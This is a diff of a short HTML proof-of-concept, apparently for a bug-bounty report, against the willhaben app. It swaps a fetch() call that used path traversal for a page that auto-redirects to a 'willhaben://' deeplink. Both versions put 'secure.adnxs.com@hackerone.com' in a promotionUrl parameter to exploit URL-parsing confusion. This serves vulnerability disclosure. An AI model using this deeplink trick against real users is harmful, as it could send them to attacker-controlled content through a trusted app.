@@ -1,4 +1,15 @@
-<script>
-fetch("https://www.willhaben.at/will/../iad/adservices?promotionUrl=https%3A%2F%2Fsecure.adnxs.com@hackerone.com")
-  .then(r => r.text()).then(console.log);
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PoC Deeplink</title>
+  <meta charset="UTF-8">
+  <script>
+    window.onload = function() {
+      window.location.href = "willhaben://iad/adservices?promotionUrl=https%3A%2F%2Fsecure.adnxs.com@hackerone.com";
+    };
+  </script>
+</head>
+<body>
+  <p>Если приложение не открылось, <a href="willhaben://iad/adservices?promotionUrl=https%3A%2F%2Fsecure.adnxs.com@hackerone.com">нажмите здесь</a>.</p>
+</body>
+</html>
